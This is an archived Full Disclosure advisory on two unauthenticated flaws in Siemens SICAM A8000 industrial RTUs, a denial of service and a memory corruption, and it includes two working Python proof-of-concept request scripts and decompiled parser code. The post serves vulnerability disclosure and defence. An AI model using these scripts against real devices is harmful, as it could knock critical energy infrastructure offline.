---
title: CyberDanube Security Research 20260408-1 | Multiple Vulnerabilities in Siemens SICAM A8000
url: https://seclists.org/fulldisclosure/2026/Apr/7
source: Full Disclosure
date: 2026-04-14
fetch_date: 2026-04-15T04:44:13.454720
---

# CyberDanube Security Research 20260408-1 | Multiple Vulnerabilities in Siemens SICAM A8000

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20260408-1 | Multiple Vulnerabilities in Siemens SICAM A8000

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 14 Apr 2026 10:45:01 +0000

---

```
CyberDanube Security Research 20260408-1
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities
              product| Siemens SICAM A8000 CP-8050/CP-8031/CP-8010/CP-8012
   vulnerable version| <=V25.30
        fixed version| V26.10
           CVE number| CVE-2026-27664
               impact| High
             homepage| https://siemens.com/
                found| 18.12.2025
                   by| S. Dietz
                     | (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna
                     |
                     | This research was conducted in cooperation with
                     | VERBUND Digital Power during a penetration test.
                     |
                     | https://www.cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"Our purpose: We create technology to transform the everyday, for everyone.
By combining the real and the digital worlds, we can help accelerate both
digitalization and sustainability - so our customers around the world can
become more competitive, resilient and sustainable."

Source: https://www.siemens.com/global/en/company/about.html

Vulnerable versions
-------------------------------------------------------------------------------
Siemens SICAM A8000 CP-8050 Master Module (6MF2805-0AA00) / <=V25.30
Siemens SICAM A8000 CP-8031 Master Module (6MF2803-1AA00) / <=V25.30
Siemens SICAM A8000 CP-8010 Master Module (6MF2801-0AA00) / <=V25.31
Siemens SICAM A8000 CP-8012 Master Module (6MF2801-2AA00) / <=V25.31

See also the vendor advisory:
https://cert-portal.siemens.com/productcert/html/ssa-246443.html

Vulnerability overview
-------------------------------------------------------------------------------
1) Unauthenticated Denial of Service
A crafted POST request with a large Content-Length and multipart boundary
without matching body seems to make the parser wait for more data. As long as
the connection is open, no other user can interact with the service. IHI00.elf
and RTUM85.elf are impacted by this.

2) Unauthenticated Memory Corruption (CVE-2026-27664)
A crafted POST request with a malicious XML body can be send to write null
bytes to an arbitrary memory address after the buffers location. This may lead
to a denial of service or remote code execution. This impacts the IHI00.elf as
well as the RTUM85.elf binary.

Proof of Concept
-------------------------------------------------------------------------------
1) Unauthenticated Denial of Service
The following python script can be used to temporarily impact the availability
of the device.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/env python3
# S. Dietz <fitfrost4>
from pwn import *

IP = "localhost"
PORT = 8080
COMP = "ihi"
path = b""

if args.IP:
    IP = args.IP
if args.PORT:
    PORT = int(args.PORT)
if args.COMP:
    COMP = args.COMP
if COMP == "rtum85":
    path = b"/sicweb-ajax/rtum85/pwned"
elif COMP == "ihi":
    path = b"/sicweb-ajax/auth"

req = b""
req += b"POST " + path + b" HTTP/1.1\r\n"
req += b"Content-Length: " + str(13371337).encode() + b"\r\n"
req += b"Content-Type: multipart/form-data; boundary=--pwned\r\n"
req += b"User-Agent: Mozilla/5.0\r\n"
req += b"Accept: */*\r\n"
req += b"Accept-Encoding: gzip, deflate, br\r\n"
req += b"Connection: keep-alive\r\n"
req += b"\r\n"

log.info(req)

with remote(IP, PORT) as io:
    io.send(req)
    io.recv(1337)

-------------------------------------------------------------------------------
2) Unauthenticated Memory Corruption (CVE-2026-27664)
The following python script can be used to crash the IHI00.elf application on
the device. As a watchdog (ISV00.elf) is active, the device reboots.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/env python3
# S. Dietz <fitfrost4>
from pwn import *

IP = "localhost"
PORT = 8080

if args.IP:
    IP = args.IP

if args.PORT:
    PORT = int(args.PORT)

buf = b'<?xml version="1.0" encoding="UTF-8"?>\n'
buf += b"<x>" * 0xa0000
buf += b"</x>"
buf += b"\r\n"

body = buf
req = b""
req += b"POST /sicweb-ajax/auth HTTP/1.1\r\n"
req += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
req += b"sec-ch-ua: \"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"\r\n"
req += b"Content-Type: application/xml\r\n"
req += b"User-Agent: Mozilla/5.0\r\n"
req += b"Accept: */*\r\n"
req += b"Accept-Encoding: gzip, deflate, br\r\n"
req += b"Connection: keep-alive\r\n"
req += b"\r\n"
req += body

with remote(IP, PORT) as io:
    io.send(req)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The issue arises due to a logic error in the XML parsing. Both binaries use
libexpat which export the function XML_SetElementHandler() which takes a
user-defined structure as well as two function pointer which are executed when
an opening or closing tag occurs.  When looking at start() it can be observed
that the tag_depth is tracked. If the depth is greater than 15, the return
value gets set to -2 and the tag_depth gets incremented.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
0052b0d4    void start(struct userdata* userData, char const* xmlchar)
0052b0da        int32_t tag_depth = userData->tag_depth
0052b0e2        int32_t* entry_r2
0052b0e2
0052b0e2        if (tag_depth != 0)
0052b0e6            if (tag_depth != 1)
0052b0fa                if (tag_depth u> 0xf)
0052b0fa                    goto too_big
[...]
0052b152    too_big:
0052b152        userData->retval = -2
0052b154        userData->tag_depth = tag_depth + 1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When a matching closing tag occurs, end() is executed. Due to a missing retval
check, the userData access happens out-of-bounds resulting in an arbitrary
null-byte overflow

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
0052a570    void end(struct userdata* userData, char const* xmlchar)
[...]
0052a584
0052a588        int32_t tag_depth = userData->tag_depth
0052a58c        userData->tag_depth = tag_depth - 1
0052a58c
0052a58e        if (tag_depth != 1)
0052a598            *(userData + ((tag_depth - 2) << 2) + 4) = 0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Further investigations showed that the bug allows an attacker to write a word
of null-bytes to arbitrary memory after the buffers location, including the
stack. Due to the extensive usage of shared libraries, this results in a large
attack surface.
-------------------------------------------------------------------------------

Solution
-------------------------------------------------------------------------------
Install the latest version available.

Workaround
------------------------------------------...